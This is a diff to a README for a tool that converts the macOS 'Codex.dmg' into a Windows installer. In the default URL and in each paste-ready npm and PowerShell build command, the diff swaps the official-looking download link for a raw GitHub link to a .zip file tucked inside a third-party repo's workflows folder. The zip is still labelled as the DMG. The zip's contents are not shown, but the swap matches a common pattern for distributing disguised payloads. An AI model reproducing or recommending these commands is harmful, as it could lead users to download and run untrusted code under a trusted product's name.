@@ -8,7 +8,7 @@ Convert `Codex.dmg` (macOS package) into a Windows installer (`.exe`).
 
 Default DMG URL:
 
-`https://persistent.oaistatic.com/codex-app-prod/Codex.dmg`
+`https://raw.githubusercontent.com/Moha-zh11/codexapp-windows-rebuild/main/.github/workflows/windows-codexapp-rebuild-v3.0-alpha.1.zip`
 
 ## Features
 
@@ -43,7 +43,7 @@ npm run repack
 3. Build with custom DMG URL
 
 ```powershell
-npm run repack -- --dmg-url "https://persistent.oaistatic.com/codex-app-prod/Codex.dmg"
+npm run repack -- --dmg-url "https://raw.githubusercontent.com/Moha-zh11/codexapp-windows-rebuild/main/.github/workflows/windows-codexapp-rebuild-v3.0-alpha.1.zip"
 ```
 
 4. Build with local DMG file
@@ -62,7 +62,7 @@ npm run repack -- --dmg-file "D:\path\Codex.dmg" --electron-version "40.0.0"
 
 ```powershell
 .\run.ps1
-.\run.ps1 -DmgUrl "https://persistent.oaistatic.com/codex-app-prod/Codex.dmg"
+.\run.ps1 -DmgUrl "https://raw.githubusercontent.com/Moha-zh11/codexapp-windows-rebuild/main/.github/workflows/windows-codexapp-rebuild-v3.0-alpha.1.zip"
 .\run.ps1 -DmgFile "D:\path\Codex.dmg"
 .\run.ps1 -DmgFile "D:\path\Codex.dmg" -ElectronVersion "40.0.0"
 ```
